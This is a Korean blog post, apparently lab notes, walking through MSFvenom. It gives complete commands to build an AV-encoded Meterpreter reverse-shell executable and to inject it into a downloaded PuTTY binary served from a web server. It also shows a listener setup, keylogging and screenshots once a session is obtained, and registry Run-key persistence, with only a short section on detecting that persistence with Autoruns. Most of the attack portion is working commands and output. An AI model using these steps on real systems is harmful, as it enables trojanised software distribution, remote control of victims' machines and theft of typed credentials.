---
layout: post
title: "MSFvenom 페이로드 생성과 백도어"
date: 2025-11-10 17:00:00 +0900
categories: [hacking-tools]
---

## 1. 개념

**MSFvenom**은 Metasploit의 페이로드 생성 도구로, 악성 실행 파일을 만들거나 기존 파일에 페이로드를 주입할 수 있습니다.

### 주요 기능
- 독립 실행형 악성코드 생성
- 기존 프로그램에 페이로드 주입
- 다양한 인코더로 AV 우회
- Reverse Shell / Bind Shell 지원

---

## 2. 사용법

### 기본 명령어
```bash
msfvenom --help
msfvenom -l encoders  # 인코더 목록
msfvenom -l payloads  # 페이로드 목록
```

### 독립 실행형 페이로드 생성
```bash
msfvenom -a x64 --platform windows \
    -p windows/x64/meterpreter/reverse_tcp \
    lhost=10.0.0.32 lport=4444 \
    -f exe -e x64/zutto_dekiru -i 3 \
    -o patch.exe
```

| 옵션 | 설명 |
|------|------|
| `-a x64` | 64비트 아키텍처 |
| `-p` | 페이로드 |
| `lhost` | 공격자 IP |
| `lport` | 리스너 포트 |
| `-f exe` | 출력 형식 |
| `-e` | 인코더(AV 우회) |
| `-i 3` | 인코딩 반복 횟수 |
| `-o` | 출력 파일명 |

### 기존 파일에 페이로드 주입
```bash
# PuTTY 다운로드
wget https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe

# 페이로드 주입
msfvenom --platform windows \
    -p windows/meterpreter/reverse_tcp \
    lhost=10.0.0.32 lport=4444 \
    -f exe -x putty.exe -e x64/zutto_dekiru -i 3 \
    -o /var/www/html/download/putty.exe
```

---

## 3. 실습 예시

### 웹 서버 배포
```bash
systemctl start apache2
mkdir /var/www/html/download
cp patch.exe /var/www/html/download/
```

### 리스너 실행
```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 10.0.0.32
run
```

### 타겟에서 실행 후 세션 획득
```bash
meterpreter > ps                 # 프로세스 목록
meterpreter > migrate [PID]      # explorer.exe로 마이그레이션
meterpreter > screenshot         # 화면 캡처
meterpreter > keyscan_start      # 키로거 시작
meterpreter > keyscan_dump       # 입력 확인
meterpreter > keyscan_stop       # 키로거 중지
```

![Meterpreter 세션 획득](/assets/images/hacking-tools/msf-meterpreter.png)

### 지속성 설정 (Persistence) - 재부팅 후 연결 유지

Meterpreter 세션이 끊기지 않도록 레지스트리에 백도어를 등록합니다.

```bash
meterpreter > background            # 세션을 백그라운드로 전환
msf6 > use exploit/windows/local/persistence
msf6 > set session 1                # 획득한 세션 ID 지정
msf6 > run
```

**실행 결과 확인**:
```
[+] Persistent VBS script written on W10-1 to C:\Users\Test\AppData\Local\Temp\rlmpmRM.vbs
[*] Installing as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\eEpjbq
[+] Installed autorun on W10-1 as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\eEpjbq
```

---

## 4. 탐지 방법 (Autoruns)

Sysinternals의 **Autoruns** 도구로 레지스트리에 등록된 의심스러운 항목을 탐지할 수 있습니다.

1. `Autoruns64.exe` 실행
2. `Logon` 탭 확인
3. `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` 경로에 의심스러운 VBS 파일 확인
   - 예: `C:\Users\Test\AppData\Local\Temp\kBbShtyOH.vbs`

---

## 5. 트러블슈팅

### 재부팅 시 세션 미복구
- 원인: 재부팅 시 GPO 설정이 초기화되어 Defender가 다시 켜지는 경우
- 해결: `gpedit.msc` 설정 재확인 및 `gpupdate /force` 수행

<hr class="short-rule">
